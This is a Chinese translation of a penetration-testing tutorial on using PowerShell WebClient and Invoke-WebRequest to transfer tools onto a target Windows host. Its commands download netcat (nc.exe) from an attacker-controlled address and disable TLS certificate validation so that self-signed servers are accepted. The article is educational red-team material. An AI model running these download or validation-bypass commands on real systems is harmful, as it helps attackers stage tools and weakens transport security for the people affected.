# 【技术分享】手把手教你使用PowerShell实现一句话Web客户端

##### 译文声明
本文为翻译文章，原文来源：[pen-testing.sans.org](http://pen-testing.sans.org)。译文仅供参考，具体内容及含义以原文为准。

**译者**：h4d35  
**预估稿费**：200 RMB  
**投稿方式**：发送邮件至 linwei#360.cn 或登录网页版在线投稿

## 引言
在渗透测试中，保持工具的可用性是区分资深专家与新手的关键因素之一。一个常见但普遍存在的问题是：如何将文件从本地传输到目标主机上。掌握多种文件传输方法对于渗透测试工程师来说是一项非常有用的技能。特别是在红蓝对抗中，有效的数据传输可能决定红队能否维持访问权限、入侵蓝队网络甚至控制域控制器。

例如，在一次对抗中，我们通过远程桌面隧道获得了GUI访问权限，但在上传工具时遇到了困难。最终，我们通过IE浏览器解决了问题。然而，本文将介绍一种更有效且强大的方案：**PowerShell**。

*Windows用户现在也可以使用类似于wget的命令了！（严格意义上讲，PowerShell中的wget只是Invoke-WebRequest命令的别名，但功能类似）。*

## 本文中用到的PowerShell命令

### Win 7 PowerShell WebClient
```powershell
(New-Object System.Net.WebClient).DownloadFile("http://10.0.0.10/nc.exe", "nc.exe")
```

### Win 8及更高版本PowerShell Invoke-WebRequest (wget)
```powershell
wget "http://10.0.0.10/nc.exe" -outfile "nc.exe"
```

### 显示PowerShell版本信息
```powershell
Get-Host
$PSVersionTable.PSVersion
```

### ServicePointManager $true
```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

### Disable-NetSSLValidation
```powershell
Invoke-SelfSignedWebRequest ([第三方工具](https://github.com/0sm0s1z/Invoke-SelfSignedWebRequest))
Invoke-SelfSignedWebRequest https://www.my.af.mil/ "-outfile index.htm"
wget-ss https://spectruminfosec.com/index.php
```

由于早期Windows系统缺乏直接的文件传输工具，向Windows环境中导入文件一直是一个难题。Windows没有自带的netcat、wget、curl、ssh或python。但有了PowerShell，这一切都变得简单了。

需要注意的是，不同版本的PowerShell之间存在显著差异。一些古老的语言如Perl、Bash和Python，其代码库一直保持相对一致，而PowerShell随着Windows操作系统的每次迭代不断发展。接下来我们将介绍适用于所有版本PowerShell的Web客户端。

## PowerShell WebClient
```powershell
(New-Object System.Net.WebClient).DownloadFile("http://10.0.0.10/nc.exe", "nc.exe")
```
此命令在任意版本的PowerShell中都可用，适合编写跨平台脚本。

### 命令分解
1. `(New-Object System.Net.WebClient)` – 创建WebClient类的实例。
2. `DownloadFile("` – 调用WebClient类的DownloadFile方法，允许从远程服务器下载文件。
3. `http://10.0.0.10` – 从IP地址为10.0.0.10的主机下载文件。
4. `/nc.exe"` – 下载nc.exe文件。
5. `,"nc.exe")` – 将下载的文件保存为nc.exe。

## PowerShell Invoke-WebRequest
```powershell
wget "http://10.0.0.10/nc.exe" -outfile "nc.exe"
```
在较新版本的PowerShell中，可以使用Invoke-WebRequest命令，该命令有一个别名wget，使用方法与Unix系统中的wget相似。

### 命令分解
1. `wget` – 简称web get，支持HTTP、HTTPS和FTP协议下载文件。
2. `"http://10.0.0.10/nc.exe"` – 从IP地址为10.0.0.10的主机下载nc.exe文件。
3. `-outfile "nc.exe"` – 将下载的文件保存为nc.exe。

Windows PowerShell从3.0版本开始引入了Invoke-WebRequest命令。可以通过`Get-Host`或`$PSVersionTable.PSVersion`命令确定当前环境中的PowerShell版本。

### 显示PowerShell版本
```powershell
Get-Host
$PSVersionTable.PSVersion
```

从Windows 7和Windows Server 2008 R2开始，PowerShell作为预装组件随系统一起发布。不幸的是，Windows 7预装的是2.0版本，许多强大命令如Invoke-WebRequest直到3.0版本才被引入。目前，现代Windows 10操作系统默认预装了5.0版本的PowerShell。

在渗透测试中，2.0版本和3.0以上版本的主要区别在于命令行的使用方式。2.0版本需要通过.NET构造函数实例化对象，而在3.0以上版本中，许多功能已被创建并集成为独立的命令，使用更加直观。

## 结论
在网络环境中，通过HTTP协议下载文件是一种很好的隐蔽流量的方式。尽管流量本身可能不显眼，但“WindowsPowerShell/5.1”这样的User-Agent还是容易引起注意。通过对流量中的敏感字眼进行过滤，防御者可以轻松筛选出可疑流量。

## 额外奖励：PowerShell中使用HTTPS
为了提高技术手段，红队可以考虑使用加密。SSL/TLS是现代Web流量的典型特征。然而，当遇到自签名或无效证书时，通常会遇到以下错误：

### 错误提示
**WebClient.DownloadFile()**
```powershell
Exception calling "DownloadFile" with "2" argument(s): "The underlying connection was closed: Could not establish trust relationship for the SSL/TLS secure channel."
```

**Invoke-WebRequest**
```powershell
The underlying connection was closed: Could not establish trust relationship for the SSL/TLS secure channel.
```

当出现`CERT_AUTHORITY_INVALID`错误时，PowerShell会自动“保护”你。作为渗透人员，我们需要绕过这些限制。对于WebClient，可以通过以下方式绕过：
```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

通过手动配置`ServerCertificateValidationCallback`使其返回$true，禁用SSL证书校验，从而允许连接到具有自签名证书的域。然而，这种方法不适用于异步回调函数，如Invoke-WebRequest和Invoke-RestMethod。在这种情况下，我们可以选择：

1. 手动安装证书
2. 在底层的.NET中禁用证书校验

作为安全专家，我们通常选择第二种方法。